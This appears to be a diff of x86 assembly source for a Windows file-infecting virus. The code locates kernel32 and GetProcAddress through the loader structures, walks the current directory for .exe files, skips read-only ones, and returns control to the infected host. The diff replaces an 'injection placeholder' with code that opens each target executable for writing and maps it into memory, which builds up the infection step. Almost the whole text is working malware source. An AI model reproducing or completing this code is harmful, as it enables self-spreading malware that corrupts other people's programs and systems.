@@ -20,14 +20,19 @@ option casemap:none
 .code
 
 data:
-	returnAddr              DWORD 000000000h
-	fileFilter              BYTE ".\*.exe",0
+	fileQuery               BYTE ".\*.exe",0
 	GetModuleFileName_str   BYTE "GetModuleFileNameA",0
 	FindFirstFile_str       BYTE "FindFirstFileA",0
 	FindNextFile_str        BYTE "FindNextFileA",0
 	FindClose_str           BYTE "FindClose",0
 	GetFullPathName_str     BYTE "GetFullPathNameA",0
 	lstrcmp_str             BYTE "lstrcmp",0
+	CreateFile_str          BYTE "CreateFileA",0
+	CreateFileMapping_str   BYTE "CreateFileMappingA",0
+	MapViewOfFile_str       BYTE "MapViewOfFile",0
+	UnmapViewOfFile_str     BYTE "UnmapViewOfFile",0
+	CloseHandle_str         BYTE "CloseHandle",0
+	returnAddr              DWORD 000000000h
 
 start:
 	call get_eip ; get the injected .exe's environment instruction pointer
@@ -82,11 +87,9 @@ second_letter_cmp:
 	cmp bx, di
 	jne loop_find_kernel32_continue
 	mov ebx, [eax + 6 * sizeof WCHAR]
-	cmp ebx, 00320033h ; 32 in WCHAR in little endian
+	cmp ebx, 00320033h ; "32" in little endian wide characters
 	jne loop_find_kernel32_continue
 	jmp loop_find_kernel32_end
-
-
 
 loop_find_kernel32_continue:
 	; (LIST_ENTRY)->Flink / get next loaded module
@@ -138,19 +141,26 @@ loop_find_gpa_end:
 	; now use the ordinal to get the function address
 	mov edx, [edx + 01Ch] ; AddressOfFunctions
 	add edx, ebx
-	mov edx,[edx + edi]
-	add edx, ebx
-	mov eax, ebx ; save kernel32 base address
+	mov ecx, [edx + edi]
+	add ecx, ebx
+	mov edi, ebx ; save kernel32 base address
+
+	; check STACK_STORAGE DWORD (4 bytes) alignment
+	xor edx, edx
+	mov ax, sizeof STACK_STORAGE
+	mov bx, 4
+	div bx
+	add dx, sizeof STACK_STORAGE
 
 	pop ebx
 	; allocate space on the stack, sp register instead of esp because
 	; the structure size fits in a WORD, saves on instruction size
-	sub sp, sizeof STACK_STORAGE
+	sub sp, dx
 
 	; store GetProcAddress address
-	mov (STACK_STORAGE PTR [esp]).GetProcAddress_addr, edx
+	mov (STACK_STORAGE PTR [esp]).GetProcAddress_addr, ecx
 	; store kernel32 base address
-	mov (STACK_STORAGE PTR [esp]).kernel32BaseAddr, eax
+	mov (STACK_STORAGE PTR [esp]).kernel32BaseAddr, edi
 
 	lea eax, [ebx + (GetModuleFileName_str - data)]
 	push eax
@@ -166,16 +176,17 @@ loop_find_gpa_end:
 	push eax
 	call GetProcAddr
 
+	mov (STACK_STORAGE PTR [esp]).fileQueryHandle, INVALID_HANDLE_VALUE
 	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
 	push edx
-	lea edx, [ebx + (fileFilter - data)]
+	lea edx, [ebx + (fileQuery - data)]
 	push edx
 	call eax ; FindFirstFile()
 
 	cmp eax, INVALID_HANDLE_VALUE
 	je loop_find_file_end
 
-	mov (STACK_STORAGE PTR [esp]).searchHandle, eax
+	mov (STACK_STORAGE PTR [esp]).fileQueryHandle, eax
 loop_find_file:
 	lea eax, [ebx + (GetFullPathName_str - data)]
 	push eax
@@ -214,10 +225,72 @@ loop_find_file:
 	cmp edx, FILE_ATTRIBUTE_READONLY
 	je loop_find_file_continue
 
-;	injection "placeholder"
-	push 0AABBCCDDh
-	pop eax
-;;
+	; Target appears good
+	lea eax, [ebx + (CreateFile_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	lea edx, (STACK_STORAGE PTR [esp]).targetName
+	push NULL
+	push FILE_ATTRIBUTE_NORMAL
+	push OPEN_EXISTING
+	push NULL
+	push (FILE_SHARE_READ or FILE_SHARE_WRITE)
+	push (GENERIC_READ or GENERIC_WRITE)
+	push edx
+	call eax ; CreateFile()
+	cmp eax, INVALID_HANDLE_VALUE
+	je loop_find_file_continue ; if handle != null
+	mov (STACK_STORAGE PTR [esp]).fileHandle, eax
+	
+	lea eax, [ebx + (CreateFileMapping_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	mov edx, (STACK_STORAGE PTR [esp]).fileHandle
+	push NULL
+	push 0
+	push 0
+	push PAGE_READWRITE
+	push NULL
+	push edx
+	call eax ; CreateFileMapping()
+	mov (STACK_STORAGE PTR [esp]).fileMappingHandle, eax
+
+	lea eax, [ebx + (MapViewOfFile_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	mov edx, (STACK_STORAGE PTR [esp]).fileMappingHandle
+	push 0
+	push 0
+	push 0
+	push (FILE_MAP_WRITE or FILE_MAP_READ)
+	push edx
+	call eax ; MapViewOfFile()
+	mov (STACK_STORAGE PTR [esp]).fileView, eax
+
+	lea eax, [ebx + (UnmapViewOfFile_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	push (STACK_STORAGE PTR [esp]).fileView
+	call eax ; UnmapViewOfFile()
+
+	lea eax, [ebx + (CloseHandle_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	push (STACK_STORAGE PTR [esp]).fileMappingHandle
+	call eax ; CloseHandle()
+
+	lea eax, [ebx + (CloseHandle_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	push (STACK_STORAGE PTR [esp]).fileHandle
+	call eax ; CloseHandle()
+
 
 loop_find_file_continue:
 	lea eax, [ebx + (FindNextFile_str - data)]
@@ -225,17 +298,30 @@ loop_find_file_continue:
 	call GetProcAddr
 
 	lea edx, (STACK_STORAGE PTR [esp]).fileStruct
-	mov ecx, (STACK_STORAGE PTR [esp]).searchHandle
+	mov ecx, (STACK_STORAGE PTR [esp]).fileQueryHandle
 	push edx
 	push ecx
 	call eax
 	cmp eax, TRUE
 	je loop_find_file
 loop_find_file_end:
+	lea eax, [ebx + (FindClose_str - data)]
+	push eax
+	call GetProcAddr
+	push (STACK_STORAGE PTR [esp]).fileQueryHandle
+	call eax ; FindClose() / close its handle
+
+	; compute STACK_STORAGE actual size in memory (with DWORD alignment)
+	xor edx, edx
+	mov ax, sizeof STACK_STORAGE
+	mov cx, 4
+	div cx
+	add dx, sizeof STACK_STORAGE
+
 	mov eax, [ebx + (returnAddr - data)]
 	cmp eax, 0
 	je end_of_code
-	add sp, sizeof STACK_STORAGE ; "free" the stack
+	add sp, dx ; "free" the stack
 	jmp eax
 
 ; arg1: function name
@@ -247,14 +333,14 @@ GetProcAddr:
 	push eax
 	push edx
 	; function name & address already in stack, hence the offsets on esp
-	push (STACK_STORAGE PTR [esp + 8]).kernel32BaseAddr
-	call (STACK_STORAGE PTR [esp + 0Ch]).GetProcAddress_addr
+	push (STACK_STORAGE PTR [esp + (sizeof DWORD * 2)]).kernel32BaseAddr
+	call (STACK_STORAGE PTR [esp + (sizeof DWORD * 3)]).GetProcAddress_addr
 	pop edx
 	jmp edx
 
 end_of_code:
-	add sp, sizeof STACK_STORAGE ; "free" the stack
-	; hard-coded call, so kernel32 is linked loaded in the infector
+	add sp, dx ; "free" the stack
+	; hard-coded call, so kernel32 is loaded in the infector
 	push 0
 	call ExitProcess
 
